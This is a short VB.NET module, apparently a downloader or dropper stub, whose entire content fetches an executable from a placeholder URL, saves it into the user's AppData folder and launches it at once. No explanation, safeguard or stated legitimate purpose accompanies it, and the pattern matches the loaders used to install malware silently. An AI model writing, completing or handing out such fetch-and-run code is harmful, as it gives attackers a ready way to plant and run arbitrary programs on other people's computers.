Module N_A_P_O_L_E_O_N
    Dim URL As String = "[URL]"
    Dim Name As String = "[Exe]"
    Dim Path As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Name
    Dim Web As New Net.WebClient
    Sub Main()
        Web.DownloadFile(URL, Path)
        Process.Start(Path)
    End Sub
End Module
